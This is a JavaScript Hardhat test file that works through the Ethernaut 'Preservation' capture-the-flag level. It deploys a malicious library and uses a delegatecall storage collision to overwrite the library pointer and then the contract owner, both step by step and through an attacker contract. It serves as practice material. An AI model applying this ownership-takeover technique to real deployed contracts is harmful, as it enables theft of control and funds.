// test/ctf/Preservation.test.js
// Exploit test for Ethernaut Level 16 — Preservation

const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("CTF: Ethernaut 16 — Preservation (delegatecall storage collision)", () => {
  let library1, library2, preservation, attacker, deployer, attackerSigner;

  beforeEach(async () => {
    [deployer, attackerSigner] = await ethers.getSigners();

    // Deploy two library instances
    const LibraryContract = await ethers.getContractFactory("LibraryContract");
    library1 = await LibraryContract.deploy();
    library2 = await LibraryContract.deploy();
    await library1.waitForDeployment();
    await library2.waitForDeployment();

    // Deploy Preservation
    const Preservation = await ethers.getContractFactory("Preservation");
    preservation = await Preservation.deploy(
      await library1.getAddress(),
      await library2.getAddress()
    );
    await preservation.waitForDeployment();

    // Deploy attacker
    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    attacker = await PreservationAttacker.connect(attackerSigner).deploy();
    await attacker.waitForDeployment();
  });

  it("Preservation owner starts as deployer", async () => {
    expect(await preservation.owner()).to.equal(deployer.address);
  });

  it("timeZone1Library starts as library1", async () => {
    expect(await preservation.timeZone1Library()).to.equal(await library1.getAddress());
  });

  it("EXPLOIT step 1: setFirstTime overwrites timeZone1Library (slot 0 collision)", async () => {
    // Deploy the malicious library
    const MaliciousLibrary = await ethers.getContractFactory("MaliciousLibrary");
    const malLib = await MaliciousLibrary.connect(attackerSigner).deploy();
    await malLib.waitForDeployment();

    // Call setFirstTime with malLib address cast to uint256
    const malAddr = await malLib.getAddress();
    await preservation.connect(attackerSigner).setFirstTime(BigInt(malAddr));

    // timeZone1Library is now malLib (slot 0 overwritten)
    expect(await preservation.timeZone1Library()).to.equal(malAddr);
  });

  it("EXPLOIT step 2: second setFirstTime overwrites owner via malicious lib", async () => {
    const MaliciousLibrary = await ethers.getContractFactory("MaliciousLibrary");
    const malLib = await MaliciousLibrary.connect(attackerSigner).deploy();
    await malLib.waitForDeployment();

    // Step 1: Replace library address
    await preservation.connect(attackerSigner).setFirstTime(
      BigInt(await malLib.getAddress())
    );

    // Step 2: Call setFirstTime again — now delegatecalls MaliciousLibrary
    //         which writes msg.sender to slot 2 (owner)
    await preservation.connect(attackerSigner).setFirstTime(0n);

    expect(await preservation.owner()).to.equal(attackerSigner.address);
  });

  it("EXPLOIT (via attacker contract): PreservationAttacker claims ownership in one tx", async () => {
    expect(await preservation.owner()).to.equal(deployer.address);

    await attacker.connect(attackerSigner).attack(await preservation.getAddress());

    // The attacker contract itself becomes the owner (not attackerSigner)
    expect(await preservation.owner()).to.equal(await attacker.getAddress());
  });
});
